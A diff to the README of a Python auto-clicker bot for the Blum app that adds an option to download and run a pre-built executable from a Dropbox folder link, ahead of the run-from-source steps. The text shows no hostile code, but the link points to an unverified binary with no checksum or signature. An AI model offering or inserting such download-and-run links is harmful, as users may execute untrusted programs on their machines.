@@ -14,6 +14,16 @@ Blum AutoClicker Bot is a Python-based auto-clicker tool designed to interact wi
 
 ## Installation
 
+### Option 1: Run the Executable
+
+Download and run the pre-built executable version of the bot from the following link:
+
+[Download Blum AutoClicker Bot Executable](https://www.dropbox.com/scl/fo/h4lass4z938q4hz0rfc6e/APRlajID3Vwg2pru7rV6Wl0?rlkey=4weyid6j77epchsr0bnh6esjx&st=qstmewnb&dl=0)
+
+No installation of Python or dependencies is required.
+
+### Option 2: Run from Source
+
 1. Clone the repository:
     ```bash
     git clone https://github.com/username/blum-autoclicker-bot.git
